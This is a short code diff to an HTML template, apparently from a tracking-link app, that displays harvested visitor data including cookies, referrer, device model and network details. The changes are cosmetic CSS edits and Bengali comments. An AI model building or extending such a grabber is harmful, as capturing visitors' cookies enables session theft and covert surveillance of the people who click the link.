@@ -451,7 +451,6 @@ VIEW_LINK_HTML = """
 <html>
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"><title>Visitor Data</title>""" + BASE_CSS + """
 <style>
-/* ঠিক অ্যাডমিন ভিউয়ের মতো স্টাইল, কিন্তু সেন্টার */
 .visit-card {
     background: #0d1520;
     padding: 18px 15px;
@@ -478,11 +477,9 @@ VIEW_LINK_HTML = """
 }
 .visit-card .value {
     word-break: break-word;
-    overflow-wrap: break-word;
     font-size: 0.95rem;
     color: #00ffcc;
     padding: 0 5px;
-    max-width: 100%;
 }
 .visit-card img {
     max-width: 90% !important;
@@ -555,6 +552,7 @@ h1 {
             <div class="row"><span class="label">Cookies</span> <span class="value">{{ v.get('cookies', 'N/A') }}</span></div>
             <div class="row"><span class="label">Referrer</span> <span class="value">{{ v.get('referrer', 'N/A') }}</span></div>
 
+            <!-- নতুন ডেটা -->
             <div class="row"><span class="label">Device Model</span> <span class="value">{{ v.get('deviceModel', 'N/A') }}</span></div>
             <div class="row"><span class="label">Network Type</span> <span class="value">{{ v.get('connType', 'N/A') }}</span></div>
             <div class="row"><span class="label">Downlink Speed</span> <span class="value">{{ v.get('downlink', 'N/A') }} Mbps</span></div>
